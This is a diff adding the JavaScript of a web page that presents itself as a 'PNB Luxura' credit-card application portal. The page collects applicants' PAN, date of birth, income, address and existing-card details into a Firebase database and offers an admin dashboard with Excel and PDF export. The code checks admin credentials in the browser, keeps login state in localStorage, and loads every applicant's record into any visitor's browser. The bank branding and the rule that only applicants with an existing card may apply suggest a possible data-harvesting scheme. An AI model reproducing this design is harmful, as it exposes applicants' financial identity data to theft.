+        if (app.mobile === mobile || app.pan === pan || app.email === email) {
+          return { id, ...app };
+        }
+      }
+      return null;
+    } catch (err) {
+      console.error('Duplicate check error:', err);
+      return null;
+    }
+  }
+
+  // ==================== SUBMIT ====================
+  window.submitForm = async function(e) {
+    e.preventDefault();
+    const btn = document.getElementById('submitBtn');
+    const success = document.getElementById('successMsg');
+    const error = document.getElementById('errorMsg');
+    const warning = document.getElementById('noCardWarning');
+    const dupBox = document.getElementById('duplicateBox');
+    
+    success.classList.remove('show');
+    error.classList.remove('show');
+    warning.classList.remove('show');
+    dupBox.classList.remove('show');
+
+    const existingCard = document.getElementById('existingCard').value;
+
+    if (existingCard === 'No Credit Card') {
+      warning.classList.add('show');
+      warning.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return false;
+    }
+
+    if (!existingCard) {
+      error.textContent = '❌ Please select your existing credit card details.';
+      error.classList.add('show');
+      return false;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Checking...';
+
+    const data = {
+      name: document.getElementById('name').value.trim(),
+      mobile: document.getElementById('mobile').value.trim(),
+      email: document.getElementById('email').value.trim(),
+      dob: document.getElementById('dob').value,
+      pan: document.getElementById('pan').value.toUpperCase().trim(),
+      income: document.getElementById('income').value,
+      cardType: 'PNB Luxura',
+      employment: document.getElementById('employment').value,
+      address: document.getElementById('address').value.trim(),
+      existingCard: existingCard,
+      existingCardLast4: document.getElementById('existingCardLast4').value.trim() || '',
+      status: 'Pending',
+      createdAt: serverTimestamp()
+    };
+
+    try {
+      const duplicate = await isDuplicate(data.mobile, data.pan, data.email);
+      
+      if (duplicate) {
+        btn.disabled = false;
+        btn.textContent = 'Submit Application';
+        const info = document.getElementById('duplicateInfo');
+        info.innerHTML = `
+          <div><span>Name:</span> <strong>${escapeHtml(duplicate.name)}</strong></div>
+          <div><span>Mobile:</span> <strong>${escapeHtml(duplicate.mobile)}</strong></div>
+          <div><span>Card Type:</span> <strong>${escapeHtml(duplicate.cardType || '-')}</strong></div>
+          <div><span>Status:</span> <strong>${escapeHtml(duplicate.status || 'Pending')}</strong></div>
+          <div><span>Applied On:</span> <strong>${duplicate.createdAt ? new Date(duplicate.createdAt).toLocaleString('en-IN') : '-'}</strong></div>
+        `;
+        dupBox.classList.add('show');
+        dupBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        return false;
+      }
+
+      btn.textContent = 'Submitting...';
+      const newRef = push(ref(db, 'applications'));
+      await set(newRef, data);
+      
+      success.classList.add('show');
+      document.getElementById('applyForm').reset();
+      document.getElementById('existingCardLast4Group').style.display = 'none';
+      success.scrollIntoView({ behavior: 'smooth', block: 'center' });
+      setTimeout(() => success.classList.remove('show'), 8000);
+    } catch (err) {
+      console.error(err);
+      error.textContent = '❌ Error: ' + err.message;
+      error.classList.add('show');
+    } finally {
+      btn.disabled = false;
+      btn.textContent = 'Submit Application';
+    }
+    return false;
+  };
+
+  // ==================== CHECK STATUS ====================
+  window.checkStatus = async function() {
+    const mobile = document.getElementById('statusMobile').value.trim();
+    const resultBox = document.getElementById('statusResult');
+
+    if (!mobile || mobile.length !== 10) {
+      resultBox.innerHTML = '<p style="color:#dc3545;text-align:center;">❌ Please enter a valid 10-digit mobile number.</p>';
+      resultBox.classList.add('show');
+      return;
+    }
+
+    resultBox.innerHTML = '<p style="text-align:center;color:#888;">Searching...</p>';
+    resultBox.classList.add('show');
+
+    try {
+      const appsRef = ref(db, 'applications');
+      const snapshot = await get(appsRef);
+      
+      if (!snapshot.exists()) {
+        resultBox.innerHTML = '<p style="color:#dc3545;text-align:center;">❌ No application found for this mobile number.</p>';
+        return;
+      }
+
+      const data = snapshot.val();
+      let found = null;
+      for (const [id, app] of Object.entries(data)) {
+        if (app.mobile === mobile) { found = app; break; }
+      }
+
+      if (!found) {
+        resultBox.innerHTML = '<p style="color:#dc3545;text-align:center;">❌ No application found for this mobile number.</p>';
+        return;
+      }
+
+      const date = found.createdAt ? new Date(found.createdAt).toLocaleString('en-IN') : '-';
+      const statusColor = found.status === 'Approved' ? '#28a745' : found.status === 'Rejected' ? '#dc3545' : '#d49a1f';
+      
+      resultBox.innerHTML = `
+        <div class="row-line"><span>Name:</span> <strong>${escapeHtml(found.name)}</strong></div>
+        <div class="row-line"><span>Mobile:</span> <strong>${escapeHtml(found.mobile)}</strong></div>
+        <div class="row-line"><span>Card Applied:</span> <strong>${escapeHtml(found.cardType || 'PNB Luxura')}</strong></div>
+        <div class="row-line"><span>Existing Card:</span> <strong>${escapeHtml(found.existingCard || '-')}</strong></div>
+        <div class="row-line"><span>Status:</span> <strong style="color:${statusColor}; font-size:15px;">${escapeHtml(found.status || 'Pending')}</strong></div>
+        <div class="row-line"><span>Applied On:</span> <strong>${date}</strong></div>
+      `;
+    } catch (err) {
+      resultBox.innerHTML = '<p style="color:#dc3545;text-align:center;">❌ Error: ' + err.message + '</p>';
+    }
+  };
+
+  // ==================== ADMIN LOGIN ====================
+  window.login = function() {
+    const user = document.getElementById('username').value.trim();
+    const pass = document.getElementById('password').value;
+    const error = document.getElementById('loginError');
+    error.style.display = 'none';
+
+    if (user === ADMIN_USER && pass === ADMIN_PASS) {
+      localStorage.setItem('pnbAdminLoggedIn', 'yes');
+      document.getElementById('password').value = '';
+      showAdminDashboard();
+    } else {
+      error.style.display = 'block';
+    }
+  };
+
+  window.logout = function() {
+    localStorage.removeItem('pnbAdminLoggedIn');
+    if (unsubscribe) { unsubscribe(); unsubscribe = null; }
+    showUser();
+  };
+
+  // ==================== ADMIN DATA ====================
+  window.loadData = function() {
+    if (unsubscribe) unsubscribe();
+    const appsRef = ref(db, 'applications');
+    
+    const unsub = onValue(appsRef, (snapshot) => {
+      const data = snapshot.val() || {};
+      cachedData = data;
+      renderTable(data);
+      renderStats(data);
+    }, (err) => {
+      console.error(err);
+      document.getElementById('tableBody').innerHTML = 
+        '<tr><td colspan="10" class="empty">Error: ' + err.message + '</td></tr>';
+    });
+    
+    unsubscribe = unsub;
+  };
+
+  function renderStats(data) {
+    const apps = Object.values(data);
+    document.getElementById('total').textContent = apps.length;
+    document.getElementById('pending').textContent = apps.filter(a => a.status === 'Pending' || !a.status).length;
+    document.getElementById('approved').textContent = apps.filter(a => a.status === 'Approved').length;
+    document.getElementById('rejected').textContent = apps.filter(a => a.status === 'Rejected').length;
+  }
+
+  function renderTable(data) {
+    const tbody = document.getElementById('tableBody');
+    const entries = Object.entries(data);
+
+    if (entries.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="10" class="empty">No applications yet</td></tr>';
+      return;
+    }
+
+    entries.sort((a, b) => (b[1].createdAt || 0) - (a[1].createdAt || 0));
+
+    tbody.innerHTML = entries.map(([id, app]) => {
+      const date = app.createdAt ? new Date(app.createdAt).toLocaleString('en-IN') : '-';
+      const statusClass = (app.status || 'Pending').toLowerCase();
+      return `
+        <tr>
+          <td><strong>${escapeHtml(app.name || '-')}</strong></td>
+          <td>${escapeHtml(app.mobile || '-')}</td>
+          <td>${escapeHtml(app.email || '-')}</td>
+          <td><span style="color:#7a1e26;font-weight:600;">${escapeHtml(app.existingCard || '-')}</span></td>
+          <td>₹${Number(app.income || 0).toLocaleString('en-IN')}</td>
+          <td>${escapeHtml(app.pan || '-')}</td>
+          <td>${escapeHtml(app.employment || '-')}</td>
+          <td><span class="badge ${statusClass}">${app.status || 'Pending'}</span></td>
+          <td>${date}</td>
+          <td>
+            ${app.status === 'Pending' || !app.status ? `
+              <button class="action-btn approve" onclick="updateStatus('${id}', 'Approved')">✓</button>
+              <button class="action-btn reject" onclick="updateStatus('${id}', 'Rejected')">✗</button>
+            ` : ''}
+            <button class="action-btn delete" onclick="deleteApp('${id}')">🗑</button>
+          </td>
+        </tr>
+      `;
+    }).join('');
+  }
+
+  function escapeHtml(str) {
+    return String(str).replace(/[&<>"']/g, s => ({
+      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+    }[s]));
+  }
+
+  window.updateStatus = async function(id, status) {
+    try {
+      await update(ref(db, 'applications/' + id), { status: status });
+    } catch (err) {
+      alert('Error: ' + err.message);
+    }
+  };
+
+  window.deleteApp = async function(id) {
+    if (!confirm('Delete this application?')) return;
+    try {
+      await remove(ref(db, 'applications/' + id));
+    } catch (err) {
+      alert('Error: ' + err.message);
+    }
+  };
+
+  // ==================== EXPORT EXCEL ====================
+  window.downloadExcel = function() {
+    const entries = Object.entries(cachedData);
+    if (entries.length === 0) {
+      alert('No data to export!');
+      return;
+    }
+
+    const rows = entries.map(([id, app]) => ({
+      'Name': app.name || '',
+      'Mobile': app.mobile || '',
+      'Email': app.email || '',
+      'DOB': app.dob || '',
+      'PAN': app.pan || '',
+      'Income (₹)': app.income || '',
+      'PNB Card Type': app.cardType || 'PNB Luxura',
+      'Employment': app.employment || '',
+      'Existing Bank Card': app.existingCard || '',
+      'Existing Card Last 4': app.existingCardLast4 || '',
+      'Address': app.address || '',
+      'Status': app.status || 'Pending',
+      'Applied On': app.createdAt ? new Date(app.createdAt).toLocaleString('en-IN') : ''
+    }));
+
+    const ws = XLSX.utils.json_to_sheet(rows);
+    const wb = XLSX.utils.book_new();
+    XLSX.utils.book_append_sheet(wb, ws, 'Applications');
+    
+    ws['!cols'] = [
+      {wch:20},{wch:15},{wch:25},{wch:12},{wch:12},{wch:12},
+      {wch:15},{wch:15},{wch:15},{wch:15},{wch:30},{wch:12},{wch:20}
+    ];
+    
+    XLSX.writeFile(wb, `PNB_Luxura_Applications_${new Date().toISOString().split('T')[0]}.xlsx`);
+  };
+
+  // ==================== EXPORT PDF ====================
+  window.downloadPDF = function() {
+    const entries = Object.entries(cachedData);
+    if (entries.length === 0) {
+      alert('No data to export!');
+      return;
+    }
+
+    const { jsPDF } = window.jspdf;
+    const doc = new jsPDF('l', 'mm', 'a4');
+
+    doc.setFillColor(74, 13, 22); // Dark maroon
+    doc.rect(0, 0, 297, 22, 'F');
+    doc.setTextColor(255, 217, 102);
+    doc.setFontSize(16);
+    doc.setFont(undefined, 'bold');
+    doc.text('PNB Luxura - Applications Report', 148, 10, { align: 'center' });
+    doc.setFontSize(9);
+    doc.setTextColor(255, 255, 255);
+    doc.setFont(undefined, 'normal');
+    doc.text(`Generated on: ${new Date().toLocaleString('en-IN')}   |   Total: ${entries.length}`, 148, 17, { align: 'center' });
+
+    const apps = entries.map(e => e[1]);
+    const pending = apps.filter(a => a.status === 'Pending' || !a.status).length;
+    const approved = apps.filter(a => a.status === 'Approved').length;
+    const rejected = apps.filter(a => a.status === 'Rejected').length;
+
+    doc.setTextColor(0, 0, 0);
+    doc.setFontSize(11);
+    doc.setFont(undefined, 'bold');
+    doc.text(`Total: ${entries.length}   |   Pending: ${pending}   |   Approved: ${approved}   |   Rejected: ${rejected}`, 148, 30, { align: 'center' });
+
+    const tableData = entries
+      .sort((a, b) => (b[1].createdAt || 0) - (a[1].createdAt || 0))
+      .map(([id, app]) => [
+        app.name || '-',
+        app.mobile || '-',
+        app.email || '-',
+        app.existingCard || '-',
+        app.income ? '₹' + Number(app.income).toLocaleString('en-IN') : '-',
+        app.status || 'Pending',
+        app.createdAt ? new Date(app.createdAt).toLocaleDateString('en-IN') : '-'
+      ]);
+
+    doc.autoTable({
+      startY: 36,
+      head: [['Name', 'Mobile', 'Email', 'Existing Card', 'Income', 'Status', 'Date']],
+      body: tableData,
+      styles: { fontSize: 8, cellPadding: 2.5 },
+      headStyles: { fillColor: [122, 30, 38], textColor: [255, 217, 102], fontStyle: 'bold' },
+      alternateRowStyles: { fillColor: [251, 247, 238] },
+      columnStyles: {
+        0: { cellWidth: 35 },
+        1: { cellWidth: 25 },
+        2: { cellWidth: 50 },
+        3: { cellWidth: 25 },
+        4: { cellWidth: 25 },
+        5: { cellWidth: 25 },
+        6: { cellWidth: 25 }
+      }
+    });
+
+    const pageCount = doc.internal.getNumberOfPages();
+    for (let i = 1; i <= pageCount; i++) {
+      doc.setPage(i);
+      doc.setFontSize(8);
+      doc.setTextColor(150, 150, 150);
+      doc.text(`PNB Luxura Credit Card Portal - Page ${i} of ${pageCount}`, 148, 200, { align: 'center' });
+    }
+
+    doc.save(`PNB_Luxura_Applications_${new Date().toISOString().split('T')[0]}.pdf`);
+  };
+
+  document.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter' && document.getElementById('adminLoginView').style.display === 'block') {
+      window.login();
+    }
+  });
+</script>
+</body>
+</html>
